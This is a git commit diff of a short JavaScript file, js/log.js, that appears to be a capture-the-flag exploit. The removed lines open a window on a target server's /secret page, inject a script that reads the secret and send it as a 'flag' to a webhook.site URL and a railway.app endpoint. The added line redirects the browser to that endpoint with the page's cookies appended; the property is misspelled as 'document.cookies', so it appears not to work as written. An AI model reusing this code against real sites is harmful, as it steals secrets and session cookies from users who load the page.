e7709b6f14a154fbd6ffc237b6630b1dccb1db07
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-17 11:13:40 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,4 +1,2 @@
-let value = window.open('http://20.235.243.131:8443/secret');
-value.window.onload=()=>{
-  value.window.document.write('<script>fetch("/secret").then(data=>data.text()).then(flag=>{fetch("https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag);window.location="https://fastapi-production-64ed.up.railway.app/bugbase?flag="+flag;})</script>');
-}
+//let value = window.open('http://20.235.243.131:8443/secret');
+window.location="https://fastapi-production-64ed.up.railway.app/bugbase?flag="+document.cookies;
